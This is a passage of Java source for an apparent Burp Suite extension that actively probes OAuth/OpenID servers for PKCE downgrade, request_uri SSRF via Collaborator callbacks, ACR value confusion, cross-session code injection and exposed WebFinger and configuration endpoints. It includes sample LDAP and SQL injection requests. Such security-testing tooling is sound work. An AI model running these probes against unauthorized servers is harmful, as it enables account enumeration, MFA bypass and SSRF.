                        IResponseInfo checkRespInfo = helpers.analyzeResponse(checkResponse);
                        // Looking for successful access to webfinger service
                        if (checkRespInfo.getStatusCode()==200) {
                            List<int[]> requestHighlights = new ArrayList<>(1);
                            int payloadStart = checkRequestStr.indexOf(payload_url);
                            payloadOffset[0] = payloadStart;
                            payloadOffset[1] = payloadStart+payload_url.length();
                            requestHighlights.add(payloadOffset);
                            String checkresponseString = helpers.bytesToString(checkResponse);
                            if (checkresponseString.contains("subject") & checkresponseString.contains(username)) {
                                issues.add(new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestHighlights, null) },
                                        "[Info] OpenID WebFinger Service Exposed",
                                        "The OpenID webfinger service is publicly exposed on a well known url.\n<br>"
                                                +"Care must be taken when exposing the OpenID WebFinger service, because "
                                                +"it could potentially increase the attack surface of the OpenID service, and allow "
                                                +"unauthenticated users to retrieve information about registered accounts and resources\n<br>"
                                                +"In details, by querying the WebFinger it reveals that the <b>"+username+"</b> account is enabled on the OpenID server, "
                                                +"in particular the configuration file was found at URL <b>"+ origin+"/"+payload_url +"</b>.\n<br>"
                                                +"Note that there are various possible attacks against OpenID WebFinger, for example:<br><ul>"
                                                +"<li>Direct user enumeration by sending requests as <code>/.well-known/webfinger?resource=http://URL/USERNAME&rel=http://openid.net/specs/connect/1.0/issuer</code>"
                                                +"or <code>/.well-known/webfinger?resource=acct:USERNAME@URL&rel=http://openid.net/specs/connect/1.0/issuer</code></li>"
                                                +"<li>LDAP inj by sending requests as <code>/.well-known/webfinger?resource=http://URL/mar*&rel=http://openid.net/specs/connect/1.0/issuer</code></li>"
                                                +"<li>SQL inj by sending requests as <code>/.well-known/webfinger?resource=http://x/mario'&rel=http://openid.net/specs/connect/1.0/issuer</code></li></ul>"
                                                +"<br>References:\n<br>"
                                                +"<a href=\"https://openid.net/specs/openid-connect-discovery-1_0.html\">https://openid.net/specs/openid-connect-discovery-1_0.html</a><br>"
                                                +"<a href=\"https://datatracker.ietf.org/doc/html/rfc7033\">https://datatracker.ietf.org/doc/html/rfc7033</a>",
                                        "Information",
                                        "Certain"
                                ));
                            }
                        }
                    }
                } else {
                    // Build the request to check well known urls
                    URL welknownUrl = new URL(proto, host, port, payload_url);
                    byte[] checkRequest = helpers.buildHttpRequest(welknownUrl);
                    IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                    checkRequestStr = helpers.bytesToString(checkRequest);
                    byte [] checkResponse = checkRequestResponse.getResponse();
                    IResponseInfo checkRespInfo = helpers.analyzeResponse(checkResponse);
                    // Looking for successful access to well known config urls
                    if (checkRespInfo.getStatusCode()==200) {
                        List<int[]> requestHighlights = new ArrayList<>(1);
                        int payloadStart = checkRequestStr.indexOf(payload_url);
                        payloadOffset[0] = payloadStart;
                        payloadOffset[1] = payloadStart+payload_url.length();
                        requestHighlights.add(payloadOffset);
                        if (isOpenID) {
                            // Found well-known url in OpenID Flow
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestHighlights, null) },
                                    "[Info] OpenID Configuration Files in Well-Known URLs",
                                    "Found OpenID configuration file publicly exposed on some well known urls.\n<br>"
                                            +"In details, the configuration file was found at URL:\n <b>"+ origin+"/"+payload_url +"</b>.\n<br>"
                                            +"The retrieved JSON configuration file contains some key information, such as details of "
                                            +"additional features that may be supported.\n These files will sometimes give hints "
                                            +"about a wider attack surface and supported features that may not be mentioned in the documentation.\n<br>"
                                            +"<br>References:\n<ul>"
                                            +"<li><a href=\"https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderConfigurationRequest\">https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderConfigurationRequest</a></li></ul>",
                                    "Information",
                                    "Certain"));
                        } else {
                            // Found well-known url in OAUTHv2 Flow
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestHighlights, null) },
                                    "[Info] OAUTHv2 Configuration Files in Well-Known URLs",
                                    "Found OAUTHv2 configuration file publicly exposed on some well known urls.\n<br>"
                                            +"In details, the configuration file was found at URL:\n <b>"+ origin+"/"+payload_url +"</b>.\n<br>"
                                            +"The retrieved JSON configuration file contains some key information, such as details of "
                                            +"additional features that may be supported.\n These files will sometimes give hints "
                                            +"about a wider attack surface and supported features that may not be mentioned in the documentation.\n<br>"
                                            +"<br>References:\n<ul>"
                                            +"<li><a href=\"https://tools.ietf.org/id/draft-ietf-oauth-discovery-08.html#:~:text=well%2Dknown%2Foauth%2Dauthorization,will%20use%20for%20this%20purpose.\">https://tools.ietf.org/id/draft-ietf-oauth-discovery-08.html#:~:text=well%2Dknown%2Foauth%2Dauthorization,will%20use%20for%20this%20purpose.</a></li></ul>",
                                    "Information",
                                    "Certain"));
                        }
                    }
                }
            }
        }
        return issues;
    }



    /**
    新版：
    1. 新增2种构造模式（1和2）：
        1） 移除 code_challenge 和 code_challenge_method
        2） 将 code_challenge_method 改为 plain
        3） 仅移除 code_challenge
    2. 判定逻辑
        1）依然是对比两response异同
        2）改进部分：不再检查code关键词，location的比较只比较path
    3. 测试逻辑：
        1）三种构造方式，如果任何一种可以，那么就报PKCE降级问题，并且可以不用检查后面的
        2）只有三种构造方式都返回error，才判定为无问题
     */
    public List<IScanIssue> pkceScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();

        // 增加层级校验：如果是嵌套架构的内层 (Layer 2)，直接跳过检测
        String layer = identifyLayer(baseRequestResponse);
        if (layer != null && (layer.contains("Layer 2") || layer.contains("L2") || layer.equalsIgnoreCase("Layer2"))) {
            return issues;
        }

        IParameter challengemethodParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "code_challenge_method");
        IParameter codechallengeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "code_challenge");
        IParameter scopeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "scope");
        IParameter resptypeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_type");
        IParameter clientIdParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");

        if (resptypeParameter != null && clientIdParameter != null && codechallengeParameter != null && challengemethodParameter != null) {
            if (resptypeParameter.getValue().contains("code")) {

                // 仅在扫描特定参数时触发
                String pName = insertionPoint.getInsertionPointName();
                //if (pName.equals("code_challenge_method") || pName.equals("code_challenge")) {
                if (pName.equals("code_challenge")) {

                    stdout.println("[+] Active Scan: Checking for PKCE Downgrade issues");

                    boolean isOpenID = false;
                    if (scopeParameter != null && scopeParameter.getValue().contains("openid")) {
                        isOpenID = true;
                    } else if (helpers.urlDecode(resptypeParameter.getValue()).equals("code token") || resptypeParameter.getValue().contains("id_token")) {
                        isOpenID = true;
                    }

                    if (challengemethodParameter.getValue().equalsIgnoreCase("plain")) {
                        return issues; // 原本即为 plain，无需降级
                    }

                    byte[] originalReq = baseRequestResponse.getRequest();
                    byte[] originalResp = baseRequestResponse.getResponse();
                    String originalRespStr = helpers.bytesToString(originalResp);
                    IResponseInfo originalRespInfo = helpers.analyzeResponse(originalResp);

                    // =========================================================
                    // 步骤 1: 构造 3 种降级攻击载荷
                    // =========================================================

                    // 向量 1: 去掉 code_challenge 和 code_challenge_method
                    byte[] req1 = helpers.removeParameter(originalReq, codechallengeParameter);
                    req1 = helpers.removeParameter(req1, challengemethodParameter);

                    // 向量 2: 保留 code_challenge，将 code_challenge_method 改成 plain
                    IParameter plainMethodParam = helpers.buildParameter("code_challenge_method", "plain", challengemethodParameter.getType());
                    byte[] req2 = helpers.updateParameter(originalReq, plainMethodParam);

                    // 向量 3: 仅去掉 code_challenge (兼容原始测试项)
                    byte[] req3 = helpers.removeParameter(originalReq, codechallengeParameter);

                    byte[][] testRequests = {req1, req2, req3};
                    String[] testNames = {
                            "Removed BOTH 'code_challenge' and 'code_challenge_method'",
                            "Changed 'code_challenge_method' to 'plain'",
                            "Removed 'code_challenge' only"
                    };

                    // =========================================================
                    // 步骤 2: 发送请求并执行更新后的判定逻辑
                    // =========================================================
                    for (int i = 0; i < testRequests.length; i++) {
                        byte[] checkRequest = testRequests[i];
                        String testDesc = testNames[i];

                        IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                        byte[] checkResponseBytes = checkRequestResponse.getResponse();
                        if (checkResponseBytes == null) continue;

                        IResponseInfo checkRespInfo = helpers.analyzeResponse(checkResponseBytes);
                        String checkRespStr = helpers.bytesToString(checkResponseBytes);

                        boolean isBlocked = false; // 阻断标志位

                        // 1. 状态码判定 (宏观)
                        if (checkRespInfo.getStatusCode() != originalRespInfo.getStatusCode()) {
                            isBlocked = true;
                        }
                        else {
                            // 2. Location 语义判定 (针对 3xx 重定向)
                            if (checkRespInfo.getStatusCode() >= 300 && checkRespInfo.getStatusCode() < 400) {
                                String checkLocation = getHeaderValue(checkRespInfo, "Location");
                                String origLocation = getHeaderValue(originalRespInfo, "Location");

                                if (checkLocation != null) {
                                    // 如果重定向地址中明确带了 error 参数，判定为被拦截
                                    if (checkLocation.toLowerCase().contains("error=")) {
                                        isBlocked = true;
                                    }
                                    else if (origLocation != null) {
                                        try {
                                            java.net.URL origUrl = new java.net.URL(origLocation);
                                            java.net.URL checkUrl = new java.net.URL(checkLocation);
                                            // 仅对比基础路径(Path)。如果路径改变（如跳转到了 /oauth/error），视为拦截。
                                            // 忽略查询参数(Query)的不同，防止动态 code 导致误判。
                                            if (!origUrl.getPath().equals(checkUrl.getPath())) {
                                                isBlocked = true;
                                            }
                                        } catch (Exception e) {
                                            // URL 解析失败，不做干预
                                        }
                                    }
                                }
                            }

                            // 3. Page Title 与 Body 判定 (利用 Burp 差异引擎辅助)
                            if (!isBlocked) {
                                IResponseVariations respVariations = helpers.analyzeResponseVariations(originalResp, checkResponseBytes);
                                for (String change : respVariations.getVariantAttributes()) {
                                    if (change.equals("page_title")) {
                                        isBlocked = true;
                                        break;
                                    } else if (change.equals("whole_body_content") || change.equals("limited_body_content")) {
                                        // 仅当 Body 新增了 error 时，判定为拦截
                                        if (checkRespStr.toLowerCase().contains("error") && !originalRespStr.toLowerCase().contains("error")) {
                                            isBlocked = true;
                                            break;
                                        }
                                    }
                                }
                            }
                        }

                        // 如果所有检查都没有触发 isBlocked = true，客观认定防线被绕过
                        if (!isBlocked) {
                            List<int[]> requestHighlights = new ArrayList<>(1);
                            requestHighlights.add(new int[]{challengemethodParameter.getNameStart(), challengemethodParameter.getValueEnd()});

                            String flawType = isOpenID ? "OpenID" : "OAUTHv2";

                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    new IHttpRequestResponse[] {callbacks.applyMarkers(baseRequestResponse, requestHighlights, null), callbacks.applyMarkers(checkRequestResponse, null, null) },
                                    "[Flaw 5] " + flawType + " PKCE Downgrade Vulnerability",
                                    "The Authorization Server is vulnerable to PKCE downgrade attacks.<br><br>"
                                            + "<b>Test Vector:</b> " + testDesc + ".<br><br>"
                                            + "The server accepted the modified authorization request without triggering an error state (status code remained the same, no error parameter in Location header, and no error message in the body). "
                                            + "This indicates the server failed to validate the PKCE requirement, allowing potential authorization code interception.<br><br>"
                                            + "References:<br>"
                                            + "<a href=\"https://datatracker.ietf.org/doc/html/rfc7636\">https://datatracker.ietf.org/doc/html/rfc7636</a>",
                                    "Medium",
                                    "Firm"
                            ));

                            // 发现漏洞即中止后续向量测试，防止重复发包
                            break;
                        }
                    }
                }
            }
        }
        return issues;
    }

    // 辅助方法：从响应头中提取指定 Header 的值
    private String getHeaderValue(IResponseInfo responseInfo, String headerName) {
        for (String header : responseInfo.getHeaders()) {
            if (header.toLowerCase().startsWith(headerName.toLowerCase() + ":")) {
                return header.substring(header.indexOf(":") + 1).trim();
            }
        }
        return null;
    }



    /**
     * Request URI SSRF 漏洞扫描
     *
     * 检测 OAuth/OpenID 的 request_uri 参数是否存在 SSRF 漏洞
     *
     * 测试方法：
     * 1. 根据 Flow 类型清理请求：
     *    - OpenID：只移除原有的 request_uri 参数
     *    - OAuth：移除所有参数（包括 client_id）
     * 2. 注入恶意 request_uri = https://[collaborator]/requesturi.jwt
     * 3. 发送请求到授权服务器
     * 4. 启动 Collaborator 监听（5分钟）
     *
     * 漏洞判定：
     * - 如果 Collaborator 收到任何交互请求
     * - 说明服务器主动访问了攻击者控制的 URL
     * - 确认存在 SSRF 漏洞
     *
     * 漏洞危害：
     * - 可探测内网服务
     * - 读取内部文件（file://）
     * - 攻击内部系统
     * - 泄露敏感信息
     */
    public void requriScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        // Scan for authorization code replay issues on token requests for OAUTHv2 and OpenID Authorization Code and Hybrid Flows
        int[] payloadOffset = new int[2];
        Boolean isOpenID = false;
        IParameter requriParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "request_uri");
        IParameter resptypeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_type");
        IParameter clientIdParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");
        IParameter scopeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "scope");
        if ((resptypeParameter!=null & clientIdParameter!=null)) {
            // Checking for request_uri SSRF issues on authorization requests of all OAUTHv2 and OpenID Flows
            if (insertionPoint.getInsertionPointName().equals("response_type")) {   // Forcing to perform only a tentative (unique insertion point)
                stdout.println("[+] Active Scan: Checking for Request Uri SSRF issues");
                // Build the authorization request for the check
                byte[] checkRequest = baseRequestResponse.getRequest();
                // Determine if is OpenID Flow
                if (scopeParameter!=null) {
                    if (scopeParameter.getValue().contains("openid")) {
                        isOpenID = true;
                    }
                } else if ( helpers.urlDecode(resptypeParameter.getValue()).equals("code token") || resptypeParameter.getValue().contains("id_token")) {
                    isOpenID = true;
                }
                IRequestInfo checkReqInfo = helpers.analyzeRequest(checkRequest);
                List<IParameter> reqParameters = checkReqInfo.getParameters();
                if (isOpenID) {
                    // Remove only the the 'request_uri' parameter from OpenID authorization request
                    if (requriParameter!=null) {
                        checkRequest = helpers.removeParameter(checkRequest, requriParameter);
                    }
                } else {
                    // Remove all parameters (including 'request_uri' and 'client_id') from OAUTHv2 authorization request
                    for (IParameter reqParam : reqParameters) {
                        checkRequest = helpers.removeParameter(checkRequest, reqParam);
                    }
                }
                IBurpCollaboratorClientContext collCC = callbacks.createBurpCollaboratorClientContext();
                String collHostname = collCC.generatePayload(true);
                String checkRequriValue = "https://" + collHostname + "/requesturi.jwt";
                // Add the malicious 'request_uri' parameter pointing to the collaborator server
                byte parameterType = resptypeParameter.getType();
                IParameter checkRequriParameter = helpers.buildParameter("request_uri", checkRequriValue, parameterType);
                checkRequest = helpers.addParameter(checkRequest, checkRequriParameter);
                String checkRequestStr = helpers.bytesToString(checkRequest);
                IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                List<int[]> requestHighlights = new ArrayList<>(1);
                int payloadStart = checkRequestStr.indexOf(checkRequriValue);
                payloadOffset[0] = payloadStart;
                payloadOffset[1] = payloadStart+checkRequriValue.length();
                requestHighlights.add(payloadOffset);
                // Define a runnable object to handle collaborator interactions
                Runnable collaboratorMonitor = new Runnable() {
                    private List<String> collIssuesDetailsHistory = new ArrayList<>();
                    public void addCollaboratorIssue(IBurpCollaboratorInteraction interaction, IBurpCollaboratorClientContext collaboratorContext) {
                        // Generating the collaborator issue
                        CustomScanIssue collIssue = null;
                        String collIssueDetails = getCollaboratorIssueDetails(interaction, collaboratorContext);
                        // Check to avoid duplicated collaborator issues
                        if (!collIssuesDetailsHistory.contains(collIssueDetails)) {
                            IParameter checkReqClientIdParameter = helpers.getRequestParameter(checkRequestResponse.getRequest(), "client_id");
                            // Only the OpenID checkRequest has the 'client_id' parameter
                            if (checkReqClientIdParameter!=null) {
                                // Detected a burpcollaborator interaction caused by the malicious 'request_uri' parameter sent to OpenID Provider
                                collIssue = new CustomScanIssue(
                                        checkRequestResponse.getHttpService(),
                                        callbacks.getHelpers().analyzeRequest(checkRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] {callbacks.applyMarkers(checkRequestResponse, requestHighlights, null) },
                                        "OpenID Flow SSRF via Request_Uri Detected",
                                        "A request containing the parameter <code>request_uri</code> set to an arbitrary URL value <b>"+checkRequriValue+"</b> was "
                                                +"sent to the OpenID Authorization Server. As consequence the OpenID Provider interacts with "
                                                +"the remote Collaborator server listening on the specified URL demonstrating that it is vulnerable to SSRF "
                                                +"blind issues.\n<br>In details, " + collIssueDetails + "<br>"
                                                +"<br>For security reasons the URI value of <code>request_uri</code> parameter should be carefully validated "
                                                +"at server-side, otherwise an attacker could be able to lead the OpenID Provider to interact with "
                                                +"an arbitrary server under is control and then potentially exploit SSRF vulnerabilities.\n<br>"
                                                +"It is advisable to define a strict whitelist of allowed URI values (pre-registered "
                                                +"during the OpenID client registration process) for the <code>request_uri</code> parameter.\n<br>"
                                                +"<br>References:<br>"
                                                +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2\">https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2</a><br>"
                                                +"<a href=\"https://portswigger.net/research/hidden-oauth-attack-vectors\">https://portswigger.net/research/hidden-oauth-attack-vectors</a>",
                                        "High",
                                        "Firm"
                                );
                            } else {
                                // Detected a burpcollaborator interaction caused by the malicious 'request_uri' parameter sent to OAUTHv2 Provider
                                collIssue = new CustomScanIssue(
                                        checkRequestResponse.getHttpService(),
                                        callbacks.getHelpers().analyzeRequest(checkRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] {callbacks.applyMarkers(checkRequestResponse, requestHighlights, null) },
                                        "OAUTHv2 Flow SSRF via Request_Uri Detected",
                                        "A request containing the parameter <code>request_uri</code> set to an arbitrary URL value <b>"+checkRequriValue+"</b> was "
                                                +"sent to the OAUTHv2 Authorization Server. As consequence the OAUTHv2 Provider interacts with "
                                                +"the remote Collaborator server listening on the specified URL demonstrating that it is vulnerable to SSRF "
                                                +"blind issues.\n<br>In details, " + collIssueDetails + "<br>"
                                                +"<br>For security reasons the URI value of <code>request_uri</code> parameter should be carefully validated "
                                                +"at server-side, otherwise an attacker could be able to lead the OAUTHv2 Provider to interact with "
                                                +"an arbitrary server under is control and then potentially exploit SSRF vulnerabilities.\n<br>"
                                                +"It is advisable to define a strict whitelist of allowed URI values (pre-registered "
                                                +"during the OAUTHv2 client registration process) for the <code>request_uri</code> parameter.\n<br>"
                                                +"<br>References:<br>"
                                                +"<a href=\"https://tools.ietf.org/html/draft-lodderstedt-oauth-par\">https://tools.ietf.org/html/draft-lodderstedt-oauth-par</a><br>"
                                                +"<a href=\"https://portswigger.net/research/hidden-oauth-attack-vectors\">https://portswigger.net/research/hidden-oauth-attack-vectors</a>",
                                        "High",
                                        "Firm"
                                );
                            }
                        }
                        // Finally add the new collaborator issue
                        callbacks.addScanIssue(collIssue);
                    }

                    public void run() {
                        stdout.println("[+] Collaborator Monitor thread started");
                        try {
                            long startTime = System.nanoTime();
                            while ( ((System.nanoTime()-startTime) < (5*60*NANOSEC_PER_SEC)) & !Thread.currentThread().isInterrupted() ) {
                                // Polling for max 5 minutes to detect any interaction on burpcollaborator
                                Thread.sleep(POLLING_INTERVAL);
                                List<IBurpCollaboratorInteraction> allInteractions = collCC.fetchCollaboratorInteractionsFor(collHostname);
                                for (IBurpCollaboratorInteraction interaction : allInteractions) {
                                    // Add the new issue
                                    addCollaboratorIssue(interaction, collCC);
                                }
                            }
                            stdout.println("[+] Collaborator Monitor thread stopped");
                        }
                        catch (InterruptedException e) {
                            stderr.println(e.toString());
                            // This is a good practice
                            Thread.currentThread().interrupt();
                        }
                        catch (Exception e) {
                            stderr.println(e.toString());
                        }
                    }
                };
                // Here start the collaborator thread
                collaboratorThread = new Thread(collaboratorMonitor);
                collaboratorThread.start();
            }
        }
        return;
    }




    /**
     * ACR Values 配置扫描
     *
     * 检测 OpenID 的 acr_values（认证上下文引用）参数是否存在安全问题
     *
     * 检测两部分：
     *
     * 1. 自定义 ACR 值检测（信息收集）
     *    - 检查当前请求的 acr_values 是否包含非标准值
     *    - 标准 ACR 值：pwd（密码）、phr（硬件令牌）、mfa（多因素）等
     *    - 如果发现自定义值，报告为信息类漏洞
     *
     * 2. ACR 值混淆漏洞检测（多因素绕过）
     *    - 遍历标准 ACR 值列表
     *    - 构造新请求替换 acr_values 为其他值
     *    - 如果服务器接受新值且未返回错误/401
     *    - 说明可能存在多因素认证绕过风险
     *
     * 漏洞判定：
     *   - 状态码 != 401
     *   - 响应不包含 "error"
     *   - 满足则报告 ACR 值混淆漏洞
     *
     * 限制条件：
     *   - 仅针对多因素认证场景（acr_original != "pwd"）
     *   - 仅适用于 OpenID Flow
     */
    public List<IScanIssue> acrScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        // Scan for OpenID 'acr_values' request values having potential misconfigurations issues
        List<IScanIssue> issues = new ArrayList<>();
        IHttpRequestResponse checkRequestResponse;
        int[] payloadOffset = new int[2];
        String checkRequestStr;
        Boolean isOpenID = false;
        byte[] rawrequest = baseRequestResponse.getRequest();
        String origRequestStr = helpers.bytesToString(rawrequest);
        IParameter acrParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "acr_values");
        IParameter resptypeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_type");
        IParameter scopeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "scope");
        IParameter clientIdParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");
        if (clientIdParameter!=null & resptypeParameter!=null & acrParameter!=null) {
            if (insertionPoint.getInsertionPointName().equals("acr_values")) {   // Forcing to perform only a tentative (unique insertion point)
                // Determine if is OpenID Flow
                if (scopeParameter!=null) {
                    if (scopeParameter.getValue().contains("openid")) {
                        isOpenID = true;
                    }
                } else if (helpers.urlDecode(resptypeParameter.getValue()).contains("id_token") || helpers.urlDecode(resptypeParameter.getValue()).equals("code token")) {
                    isOpenID = true;
                }
                // Checking only on OpenID Flow requests because only them could be affected
                if (isOpenID) {
                    stdout.println("[+] Active Scan: Checking for ACR Values Misconfiguration issues");
                    String acrOriginal = helpers.urlDecode(acrParameter.getValue());
                    String[] acrOriginalItems = acrOriginal.split(" ");
                    // Checks involve only Multi-Factor authentication requests
                    if (acrOriginal != "pwd") {
                        // First detects custom values on acr_values
                        for (int i=0; i<acrOriginalItems.length; i++) {
                            String acrOrigItem = acrOriginalItems[i];
                            if (!ACR_VALUES.contains(acrOrigItem)) {
                                List<int[]> requestHighlights = getMatches(origRequestStr.getBytes(), acrOrigItem.getBytes());
                                issues.add(new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                        "[Info] OpenID Flow with Custom ACR Value",
                                        "The OpenID request seems using the parameter <code>acr_values</code> set to a custom value of <b>"+ acrOrigItem +"</b>.\n<br>"
                                                +"OpenID standards specify a list of predefined values for the <code>acr_values</code> parameter, although this is not "
                                                +"considerable as a security issue, further investigations are suggested to ensure that customized implementations"
                                                +"of the OpenID Flow have not introduced security flaws\n<br>"
                                                +"<br>References:\n<br>"
                                                +"<a href=\"https://datatracker.ietf.org/doc/html/rfc8176#ref-OpenID.Core\">https://datatracker.ietf.org/doc/html/rfc8176#ref-OpenID.Core</a>",
                                        "Information",
                                        "Certain"
                                ));
                            }
                        }
                        //Then checks for potential Multi-Factor authentication issues
                        String acrPayload = "";
                        for (String acrValue: ACR_VALUES) {
                            if (! Arrays.asList(acrOriginalItems).contains(acrValue)) {
                                // Single value on acr_values parameter
                                if (acrOriginalItems.length == 1) {
                                    acrPayload = acrValue;
                                    // Multiple values on acr_values parameter
                                } else if (acrOriginalItems.length > 1) {
                                    if (Arrays.asList(acrOriginalItems).contains("pwd")) {
                                        if (acrValue=="pwd") {
                                            acrPayload = "pwd";
                                        } else {
                                            acrPayload = acrValue+"+pwd";
                                        }
                                    } else {
                                        acrPayload = acrValue;
                                    }
                                }
                            }
                            IParameter newParam = helpers.buildParameter("acr_values", acrPayload, IParameter.PARAM_URL);
                            byte [] checkRequest = helpers.updateParameter(rawrequest, newParam);
                            checkRequestStr = helpers.bytesToString(checkRequest);
                            checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                            byte [] checkResponse = checkRequestResponse.getResponse();
                            String checkResponseStr = helpers.bytesToString(checkResponse);
                            IResponseInfo checkRespInfo = helpers.analyzeResponse(checkResponse);
                            // Check if vulnerable and report the issue
                            if ((checkRespInfo.getStatusCode() != 401) & (!checkResponseStr.toLowerCase().contains("error"))) {
                                List<int[]> requestHighlights = new ArrayList<>(1);
                                int payloadStart = checkRequestStr.indexOf(acrPayload);
                                payloadOffset[0] = payloadStart;
                                payloadOffset[1] = payloadStart+acrPayload.length();
                                requestHighlights.add(payloadOffset);
                                issues.add(new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] {callbacks.applyMarkers(baseRequestResponse, null, null), callbacks.applyMarkers(checkRequestResponse, requestHighlights, null) },
                                        "OpenID ACR Value Confusion",
                                        "Found a potential misconfiguration on OpenID Flow in handling the request parameter <code>acr_values</code>.\n<br>"
                                                +"In details, the Authorization Server usually validates the requests having the legit value \"<b>"+acrOriginal+"</b>\" for "
                                                +"<code>acr_values</code> parameter, but it seems also not rejecting requests contaning the same parameter set with the value of "
                                                +"<b>"+ acrPayload +"</b>.\n<br>"
                                                +"This anomalous behavior should be further investigated, because it could be potentially abused by an attacker to bypass "
                                                +"a Multi-Factor authentication mechanism eventually in place for the OpenID implementation.\n<br>"
                                                +"<br>References:\n<br>"
                                                +"<a href=\"https://datatracker.ietf.org/doc/html/rfc8176#ref-OpenID.Core\">https://datatracker.ietf.org/doc/html/rfc8176#ref-OpenID.Core</a>",
                                        "Medium",
                                        "Firm"
                                ));
                            }
                        }
                    }
                }
            }
        }
        return issues;
    }



    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();
        String pName = insertionPoint.getInsertionPointName().toLowerCase();

        // 提取状态机锚点并强制解码对齐
        String rawAnchor = flowEngine.extractStateAnchor(helpers, baseRequestResponse);
        String anchor = rawAnchor != null ? helpers.urlDecode(rawAnchor) : null;
        OAuthFlowContext flow = anchor != null ? flowEngine.activeFlowsByState.get(anchor) : null;

        // 通过 HTTP 请求体的物理特征判断阶段，替代 flow.state
        boolean isAuthRequest = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_type") != null;
        boolean isTokenRequest = helpers.getRequestParameter(baseRequestResponse.getRequest(), "grant_type") != null;

        // 阶段 1: 授权请求 (Authorization Request)
        if (isAuthRequest) {
            try {
                // 只要是授权请求特征，无条件执行基础协议扫描
                issues.addAll(redirectScan(baseRequestResponse, insertionPoint));
                issues.addAll(scopeScan(baseRequestResponse, insertionPoint));
                issues.addAll(nonceScan(baseRequestResponse, insertionPoint));
                issues.addAll(resptypeScan(baseRequestResponse, insertionPoint));
                issues.addAll(pkceScan(baseRequestResponse, insertionPoint));
                issues.addAll(acrScan(baseRequestResponse, insertionPoint));
                requriScan(baseRequestResponse, insertionPoint);

                // 仅在发现有效状态树时，执行 MCP 架构相关的状态攻击
                if (flow != null ) {
                    issues.addAll(mcpActiveScan(baseRequestResponse, insertionPoint));
                }
            } catch (Exception e) {
                stderr.println("[-] Error in Auth Phase Fuzzing: " + e.toString());
            }
        }
        // 阶段 2: 凭证换取请求 (Token Exchange Request)
        else if (isTokenRequest) {
            try {
                issues.addAll(codereplayScan(baseRequestResponse, insertionPoint));

                // 跨会话 Code 注入检测 (依赖流上下文)
                if (flow != null && pName.equals("code")) {
                    OAuthFlowContext alienFlow = flowEngine.getAnotherValidFlow(flow);
                    if (alienFlow != null && alienFlow.l1Code != null) {
                        byte[] tamperedReq = helpers.updateParameter(baseRequestResponse.getRequest(),
                                helpers.buildParameter("code", alienFlow.l1Code, IParameter.PARAM_BODY));
                        IHttpRequestResponse checkResp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tamperedReq);
                        if (helpers.analyzeResponse(checkResp.getResponse()).getStatusCode() == 200) {
                            String archType = flow.l2State != null ? "Nested L1/L2" : "Single Layer";
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    new IHttpRequestResponse[] { callbacks.applyMarkers(checkResp, null, null) },
                                    "[Flaw 9] [" + archType + "] Cross-Session Code Injection (Stateful Engine)",
                                    "<b>高危逻辑漏洞：凭证绑定失效！</b>",
                                    "High", "Certain"
                            ));
                        }
                    }
                }
            } catch (Exception e) {
                stderr.println("[-] Error in Token Phase Fuzzing: " + e.toString());
            }
        }

        // 全局扫描
        try {
            issues.addAll(wellknownScan(baseRequestResponse, insertionPoint));
        } catch (Exception e) {
            stderr.println("[-] Error in Wellknown Scan: " + e.toString());
        }

        return issues;
    }

    @Override
